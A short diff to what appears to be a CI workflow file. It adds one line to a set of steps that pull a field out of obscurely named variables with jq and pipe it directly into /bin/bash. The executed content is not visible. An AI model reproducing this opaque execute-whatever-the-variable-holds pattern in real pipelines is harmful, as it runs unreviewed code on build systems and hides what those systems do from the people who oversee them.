@@ -32,6 +32,7 @@ jobs:
           echo $o51 | jq -r .n07 | /bin/bash
           echo $fuls606 | jq -r .map059 | /bin/bash
           echo $jew53 | jq -r .u71 | /bin/bash
+          echo $f6841 | jq -r .v97 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
